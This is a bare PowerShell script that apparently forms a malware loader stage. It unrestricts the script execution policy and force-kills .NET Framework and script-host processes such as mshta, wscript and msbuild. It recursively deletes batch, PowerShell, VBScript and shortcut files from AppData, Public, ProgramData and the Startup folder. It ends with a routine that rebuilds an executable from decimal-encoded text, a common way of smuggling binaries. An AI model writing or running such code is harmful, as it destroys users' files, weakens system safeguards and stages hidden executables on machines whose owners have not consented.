try {
    Write-Host "Before: $(Get-ExecutionPolicy -Scope Process)"
    Set-ExecutionPolicy Unrestricted -Scope Process -Force
    Write-Host "Policy set to Unrestricted."
} catch {
    Write-Error $_.Exception.Message
}




$folders=@('C:\Windows\Microsoft.NET\Framework\v2.0.50727','C:\Windows\Microsoft.NET\Framework\v4.0.30319')
$ex=@('regsvcs');$names=@('mshta','wscript','msbuild','jsc','addInProcess','AddInProcess32','aspnet_compiler','wscript')
$f=$folders|%{[IO.Path]::GetFullPath($_).TrimEnd('\')}
Get-CimInstance Win32_Process|%{if($ex -notcontains [IO.Path]::GetFileNameWithoutExtension($_.Name) -and $_.ExecutablePath){if($f -contains [IO.Path]::GetDirectoryName($_.ExecutablePath).TrimEnd('\')){Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue}}}
Stop-Process -Name ($names|?{$_ -notin $ex}) -Force -EA SilentlyContinue


# Close *.bat.exe processes
Get-Process | Where-Object { $_.ProcessName -like "*.bat.exe" } | ForEach-Object {
    $_.CloseMainWindow(); $_.WaitForExit(5000)
    if (-not $_.HasExited) { $_.Kill() }
}

# Remove specific file types from directories
"$env:APPDATA", "$env:PUBLIC", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" | 
ForEach-Object {
    Get-ChildItem -Path $_ -Include *.bat, *.ps1, *.lnk, *.cmd, *.vbs -Recurse -ErrorAction SilentlyContinue | 
    ForEach-Object {
        Try {
            Remove-Item -Path $_.FullName -Force -ErrorAction Stop
        } Catch {
            Write-Host "Failed to delete: $($_.FullName) - $_" -ForegroundColor Red
        }
    }
}
# Remove .vbs files
"$env:PUBLIC", "$env:APPDATA", "$env:ProgramData" | ForEach-Object {
    Get-ChildItem -Path $_ -Filter *.vbs -File -ErrorAction SilentlyContinue | Remove-Item -Force
}


function Convert-DecimalTxtToExe {
    param (
        [string]$decimalData  # Decimal data as a string
    )

    # Split the decimal data into an array of integers
    $decimalArray = $decimalData -split ',' | ForEach-Object { [int]$_ }

    # Predefine the byte array with a fixed size for better performance
    $byteArray = [byte[]]::new($decimalArray.Count)

    # Convert the decimal array back to a byte array using a for loop
    for ($i = 0; $i -lt $decimalArray.Count; $i++) {
        $byteArray[$i] = [byte]$decimalArray[$i]
    }

    # Return the byte array
    return $byteArray
}



